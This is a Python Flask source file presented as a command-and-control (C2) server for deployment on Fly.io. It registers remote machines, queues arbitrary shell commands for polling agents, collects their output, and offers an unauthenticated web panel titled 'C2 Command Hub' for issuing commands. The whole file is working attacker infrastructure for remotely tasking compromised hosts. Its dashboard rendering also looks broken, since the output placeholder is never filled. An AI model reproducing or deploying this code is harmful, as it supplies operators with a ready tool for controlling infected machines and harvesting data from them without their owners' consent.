# server.py - C2 server for Fly.io

import os
import sqlite3
from datetime import datetime, timezone
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# Persistent database path (Fly.io volume)
DB_PATH = "/data/commands.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  hostname TEXT,
                  command TEXT,
                  status TEXT DEFAULT 'pending',
                  output TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (hostname TEXT PRIMARY KEY,
                  last_seen DATETIME,
                  ip TEXT)''')
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# Ensure DB and tables exist
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
init_db()

# --- API for agent ---
@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    hostname = data.get('hostname')
    if hostname:
        conn = get_db()
        conn.execute("INSERT OR REPLACE INTO devices (hostname, last_seen, ip) VALUES (?, ?, ?)",
                     (hostname, datetime.now(timezone.utc), request.remote_addr))
        conn.commit()
        conn.close()
    return jsonify({"status": "ok"})

@app.route('/api/poll/<hostname>', methods=['GET'])
def poll(hostname):
    conn = get_db()
    row = conn.execute("SELECT id, command FROM commands WHERE hostname = ? AND status = 'pending' ORDER BY id LIMIT 1",
                       (hostname,)).fetchone()
    if row:
        conn.execute("UPDATE commands SET status = 'sent' WHERE id = ?", (row['id'],))
        conn.commit()
        conn.close()
        return jsonify({"command": row['command']})
    conn.close()
    return jsonify({"command": ""})

@app.route('/api/result', methods=['POST'])
def result():
    data = request.json
    hostname = data.get('hostname')
    output = data.get('output')
    if hostname and output:
        conn = get_db()
        # Find the most recent 'sent' command for this hostname
        row = conn.execute("SELECT id FROM commands WHERE hostname = ? AND status = 'sent' ORDER BY id DESC LIMIT 1",
                           (hostname,)).fetchone()
        if row:
            conn.execute("UPDATE commands SET status = 'completed', output = ? WHERE id = ?", (output, row['id']))
        else:
            # orphaned result (should not happen)
            conn.execute("INSERT INTO commands (hostname, command, status, output) VALUES (?, ?, 'orphaned', ?)",
                         (hostname, "[auto]", output))
        conn.commit()
        conn.close()
    return jsonify({"status": "ok"})

# --- Web dashboard (optional) ---
HTML = '''
<!DOCTYPE html>
<html><head><title>C2 Panel</title><style>body{background:#0a0c10;color:#ddd;font-family:monospace;}</style></head>
<body>
<h1>C2 Command Hub</h1>
<form method="post" action="/send">
    Hostname: <input name="hostname"><br>
    Command: <textarea name="command" rows="3" cols="60"></textarea><br>
    <input type="submit" value="Send">
</form>
<h2>Recent results</h2>
<pre>%s</pre>
</body></html>
'''

@app.route('/')
def dashboard():
    conn = get_db()
    rows = conn.execute("SELECT hostname, command, output, timestamp FROM commands ORDER BY id DESC LIMIT 20").fetchall()
    conn.close()
    out = "\n".join([f"[{r['timestamp']}] {r['hostname']} > {r['command']}\n{r['output']}\n{'-'*40}" for r in rows])
    return render_template_string(HTML, out)

@app.route('/send', methods=['POST'])
def send():
    hostname = request.form.get('hostname')
    command = request.form.get('command')
    if hostname and command:
        conn = get_db()
        conn.execute("INSERT INTO commands (hostname, command) VALUES (?, ?)", (hostname, command))
        conn.commit()
        conn.close()
    return dashboard()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
